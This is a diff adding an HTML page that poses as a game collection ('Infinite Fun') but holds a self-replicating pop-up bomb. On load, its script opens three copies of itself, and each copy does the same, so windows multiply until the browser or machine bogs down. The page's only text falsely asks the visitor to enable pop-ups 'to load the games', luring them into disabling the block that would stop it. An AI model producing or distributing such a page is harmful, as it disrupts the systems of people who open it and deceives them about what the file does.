@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<!-- saved from url=(0060)file:///C:/Users/holbrook4083/Desktop/FunGameCollection.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Infinite Fun</title>
+    <script>
+        // Trigger the script immediately when the window loads
+        window.onload = function() {
+            // Number of new windows this specific instance will spawn
+            const spawnCount = 3;
+            const currentFile = window.location.href;
+
+            for (let i = 0; i < spawnCount; i++) {
+                setTimeout(() => {
+                    // Opens a small, independent window
+                    window.open(currentFile, '_blank', 'width=300,height=200,left=' + (i * 100) + ',top=' + (i * 100));
+                }, i * 500); // Opens a new one every half second
+            }
+        };
+    </script>
+</head>
+<body style="background-color: #000; color: #00ff00; font-family: monospace; text-align: center; margin-top: 100px;">
+    <h1>Please enable pop-ups to load the games.</h1>
+</body></html>
